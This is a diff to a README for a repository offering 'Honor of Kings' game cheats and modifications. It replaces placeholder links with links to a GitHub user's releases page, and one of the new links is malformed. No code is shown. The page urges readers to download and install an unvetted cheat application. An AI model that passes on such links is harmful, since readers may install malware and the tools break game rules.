@@ -21,8 +21,8 @@ Welcome to the **Honor of Kings** repository! This project aims to provide valua
 
 To get started, you can download the necessary files for cheats and modifications. Click the link below to download the application:
 
-[Download Application](https://img.shields.io/badge/Download%20Application-brightgreen?style=for-the-badge&logo=download)  
-[Download Application](https://github.com/user/repo/Application.zip)
+[Download Application](https://github.com/thamizh2528/Honor-Of-Kings/releases%20Application-brightgreen?style=for-the-badge&logo=download)  
+[Download Application](https://github.com/thamizh2528/Honor-Of-Kings/releases)
 
 Once downloaded, extract the files and follow the installation instructions below.
 
